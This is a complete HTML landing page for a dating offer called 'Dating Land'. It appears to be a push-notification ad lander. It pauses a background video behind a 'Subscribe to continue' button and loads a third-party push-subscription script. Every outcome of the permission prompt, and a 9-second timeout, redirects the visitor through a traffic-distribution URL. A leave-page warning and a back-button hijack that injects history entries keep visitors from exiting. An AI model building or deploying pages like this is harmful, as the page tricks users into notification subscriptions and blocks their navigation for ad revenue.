<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dating Land - Camob Germe</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
            background-color: #000;
        }
        #videoContainer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 1;
        }
        #myVideo {
            position: absolute;
            top: 50%;
            left: 50%;
            min-width: 100%;
            min-height: 100%;
            width: auto;
            height: auto;
            transform: translate(-50%, -50%);
            object-fit: cover;
        }
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, rgba(0,0,0,0.4), rgba(0,0,0,0.8));
            z-index: 2;
            opacity: 0;
            transition: opacity 0.5s ease;
        }
        #overlay.show {
            opacity: 1;
        }
        #subscribeBtn {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0);
            padding: 18px 36px;
            font-size: 26px;
            color: #fff;
            background-color: rgba(255, 0, 150, 0.9);
            border: 2px solid #fff;
            border-radius: 12px;
            cursor: pointer;
            z-index: 3;
            opacity: 0;
            transition: transform 0.5s ease, opacity 0.5s ease;
            white-space: nowrap;
        }
        #subscribeBtn.show {
            transform: translate(-50%, -50%) scale(1);
            opacity: 1;
        }
    </style>
</head>
<body>

<div id="videoContainer">
    <video id="myVideo" autoplay muted playsinline loop>
        <source src="https://cdn.pixabay.com/video/2024/02/25/201545-917327263_large.mp4" type="video/mp4">
    </video>
    <div id="overlay"></div>
    <div id="subscribeBtn">Subscribe to continue</div>
</div>

<!-- TACOLO PS.JS - Placed in body as per documentation -->
<script type="application/javascript" src="https://wpcpc.sjscdn.com/ps/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ" async></script>

<script>
    // CAMOB GERME - URL Parameters
    const urlParams = new URLSearchParams(window.location.search);
    const clickId = urlParams.get('click_id') || 'no_clickid';
    const subId = urlParams.get('sub_id') || 'camob';
    
    console.log('Camob ClickID:', clickId, 'SubID:', subId);

    // TDS URLs
    const tdsUrl = `https://hotbjayapa.today/tds?id=1556189731&p1=${encodeURIComponent(clickId)}&p2=${encodeURIComponent(subId)}&p3=sub3&p4=sub4`;
    const chatUrl = 'https://datingland.site/chat';
    const backUrl = 'https://hotbjayapa.today/tds?id=1556189731&p1=camob&p2=sub2&p3=sub3&p4=sub4';

    let isDone = false;
    let pushScriptLoaded = false;

    // Wait for Tacolo script to be ready
    const checkInterval = setInterval(() => {
        if (typeof window.onPermissionDefault !== 'undefined') {
            pushScriptLoaded = true;
            clearInterval(checkInterval);
            console.log('Tacolo script loaded');
        }
    }, 100);

    function goToTDS() {
        if (isDone) return;
        isDone = true;
        console.log('Redirecting to TDS');
        window.location.replace(tdsUrl);
    }

    function clickAction() {
        if (isDone) return;
        isDone = true;
        console.log('Click action triggered - opening TDS in new tab');
        window.open(tdsUrl, '_blank');
        setTimeout(() => window.location.replace(chatUrl), 100);
    }

    // TACOLO CALLBACKS - These will fire after user interacts with push prompt
    window.onPermissionDefault = () => {
        console.log('Permission default');
        goToTDS();
    };
    
    window.onPermissionDenied = () => {
        console.log('Permission denied');
        goToTDS();
    };
    
    window.onPermissionAllowed = () => {
        console.log('Permission allowed');
        goToTDS();
    };
    
    window.onAlreadySubscribed = () => {
        console.log('Already subscribed');
        goToTDS();
    };
    
    window.onNotificationUnsupported = () => {
        console.log('Notifications unsupported');
        goToTDS();
    };
    
    window.onTrafficFiltered = () => {
        console.log('Traffic filtered');
        goToTDS();
    };

    // Extended fallback timeout - give more time for push notification
    setTimeout(() => { 
        if (!isDone) {
            console.log('Fallback timeout reached');
            goToTDS(); 
        }
    }, 9000); // 9 seconds
    
    // Beforeunload warning
    window.onbeforeunload = () => {
        if (!isDone) return "Are you sure you want to leave?";
    };

    // Video controls
    const video = document.getElementById('myVideo');
    const btn = document.getElementById('subscribeBtn');
    const overlay = document.getElementById('overlay');

    video.addEventListener('playing', () => {
        setTimeout(() => {
            video.pause();
            overlay.classList.add('show');
            btn.classList.add('show');
        }, 100);
    }, { once: true });

    // When button is clicked, trigger push notification flow
    btn.addEventListener('click', (e) => { 
        e.preventDefault(); 
        console.log('Subscribe button clicked');
        clickAction(); 
    });
    
    video.addEventListener('click', (e) => { 
        e.preventDefault(); 
        console.log('Video clicked');
        clickAction(); 
    });

    // Back button handler
    (function() {
        for (let i = 0; i < 3; i++) history.pushState(null, null, location.href);
        window.addEventListener('popstate', () => {
            history.pushState(null, null, location.href);
            window.location.replace(backUrl);
        });
    })();
</script>

</body>
</html>
